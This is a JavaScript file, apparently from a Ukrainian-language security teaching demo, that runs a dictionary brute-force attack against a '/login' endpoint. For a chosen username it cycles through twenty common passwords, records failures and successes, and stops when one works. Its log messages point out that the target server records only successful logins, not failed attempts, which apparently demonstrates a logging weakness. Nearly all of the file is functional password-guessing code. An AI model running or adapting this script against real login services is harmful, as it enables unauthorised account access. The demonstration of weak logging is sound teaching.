let attackInterval = null;
let startTime = null;
let timerInterval = null;

const commonPasswords = [
    '123456', 'password', '12345678', 'qwerty', '123456789',
    'admin', 'letmein', 'welcome', '1234', 'abc123',
    'password123', 'admin123', 'root', 'toor', 'pass',
    '1234567890', 'test', 'guest', 'hello', 'master'
];

let stats = {
    attempts: 0,
    fails: 0,
    success: 0
};

function log(message, type = 'info') {
    const logDiv = document.getElementById('attackLog');
    const timestamp = new Date().toLocaleTimeString();
    const line = document.createElement('div');
    line.className = `log-line log-${type}`;
    line.textContent = `[${timestamp}] ${message}`;
    logDiv.appendChild(line);
    logDiv.scrollTop = logDiv.scrollHeight;
}

function updateStats() {
    document.getElementById('attemptCount').textContent = stats.attempts;
    document.getElementById('failCount').textContent = stats.fails;
    document.getElementById('successCount').textContent = stats.success;
}

function updateTimer() {
    if (startTime) {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        document.getElementById('timeElapsed').textContent = elapsed;
    }
}

async function tryLogin(username, password) {
    try {
        const response = await fetch('/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });

        const data = await response.json();
        stats.attempts++;

        if (data.success) {
            stats.success++;
            log(`УСПІХ! Знайдено пароль: ${password}`, 'success');
            log(`Увага: Ця успішна спроба БУДЕ в логах сервера!`, 'info');
            stopAttack();
            updateStats();
            return true;
        } else {
            stats.fails++;
            log(`Невдало: ${username} / ${password}`, 'error');
            updateStats();
            return false;
        }
    } catch (error) {
        log(`Помилка з'єднання: ${error.message}`, 'error');
        return false;
    }
}

async function startAttack() {
    if (attackInterval) {
        log('Атака вже запущена!', 'info');
        return;
    }

    const username = document.getElementById('targetUsername').value;
    const delay = parseInt(document.getElementById('attackDelay').value);

    if (!username) {
        alert('Введіть ім\'я користувача!');
        return;
    }

    // Скидаємо статистику
    stats = { attempts: 0, fails: 0, success: 0 };
    updateStats();
    document.getElementById('attackLog').innerHTML = '';

    startTime = Date.now();
    timerInterval = setInterval(updateTimer, 1000);

    log(`Початок атаки на користувача: ${username}`, 'info');
    log(`Затримка між спробами: ${delay}мс`, 'info');
    log(`Буде перевірено ${commonPasswords.length} паролів`, 'info');
    log(`Важливо: Невдалі спроби НЕ будуть логуватися сервером!`, 'info');
    log('─────────────────────────────────────', 'info');

    let index = 0;

    attackInterval = setInterval(async () => {
        if (index >= commonPasswords.length) {
            stopAttack();
            log('─────────────────────────────────────', 'info');
            log('Атака завершена. Всі паролі перевірено.', 'info');
            log(`Результат: ${stats.success} успіхів з ${stats.attempts} спроб`, 'info');
            log('Перевірте логи сервера — там будуть ТІЛЬКИ успішні входи!', 'info');
            return;
        }

        const password = commonPasswords[index];
        const success = await tryLogin(username, password);

        if (success) {
            log('─────────────────────────────────────', 'info');
            log('Пароль знайдено! Атака зупинена.', 'success');
            log('Перевірте /logs — там буде запис про успішний вхід', 'info');
            log('НО: Всі попередні невдалі спроби НЕ залогувалися!', 'info');
        }

        index++;
    }, delay);
}

function stopAttack() {
    if (attackInterval) {
        clearInterval(attackInterval);
        attackInterval = null;
    }
    if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
    }
    startTime = null;
    log('Атака зупинена', 'info');
}

// Зупинка при закритті сторінки
window.addEventListener('beforeunload', stopAttack);